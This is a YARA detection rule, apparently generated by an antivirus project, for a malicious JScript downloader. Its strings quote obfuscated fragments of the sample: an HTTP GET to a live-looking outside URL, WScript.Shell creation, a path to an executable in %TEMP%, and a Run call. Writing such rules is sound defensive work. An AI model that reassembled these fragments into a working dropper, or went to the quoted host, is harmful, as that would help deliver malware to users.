rule sig_20160401_dcff48de5e4c22bf67ba5a78c44d678c {
  meta:
    description = "datamaliciousorder - file 20160401_dcff48de5e4c22bf67ba5a78c44d678c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3c511112a28755e2a2501fff635cb2418c27cdfb52504687a165370f9da52ba8"

  strings:
    $s1  = "NuKzg[FwdQyo](\"G\" + \"ET\", \"http://geetanjalifincorp.com/pqw9aso\", false);" fullword ascii
    $s2  = "var RdIm = function YiXck() {return WScript[HecDcj](\"WScript\"+\".Shell\");}(), WhqElr = 11;" fullword ascii
    $s3  = "function HuhIy(NwmHd, TxLy){PtxTrr = PtxTrr * 1; return NwmHd - TxLy;};" fullword ascii
    $s4  = "if (NuKzg[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function NayLzo() {return RdIm[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"vqATkOd2u0eJR.ex\" + \"e\";};" fullword ascii
    $s6  = "function AbdSt(){return RjiRix + \"\";};" fullword ascii
    $s7  = "function QqSnh() {return ((SbRp == true) && (SbRp == XiAyi)) ? 1 : PtxTrr;};" fullword ascii
    $s8  = "function HzfAa()" fullword ascii
    $s9  = "function EqXjn(){return 23;};" fullword ascii
    $s10 = "var SbRp = false;" fullword ascii
    $s11 = "return HuhIy(NxjOum, FuHc);" fullword ascii
    $s12 = "}while (UcxGqj);" fullword ascii
    $s13 = "SbRp = true; " fullword ascii
    $s14 = "var CbaZnu = new this[\"Date\"]();" fullword ascii
    $s15 = "function XfiGd(GeCe){RdIm[\"R\"+\"un\"](GeCe, PtxTrr, PtxTrr);};" fullword ascii
    $s16 = "var XiAyi = false;" fullword ascii
    $s17 = "function MjOda(JsZzc) {var CwbYrf = (1, 2, 3, 4, 5, JsZzc); return CwbYrf;};" fullword ascii
    $s18 = "function KgoYq(){return HecDcj;};" fullword ascii
    $s19 = "XiAyi = true; " fullword ascii
    $s20 = "var JcAjb = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}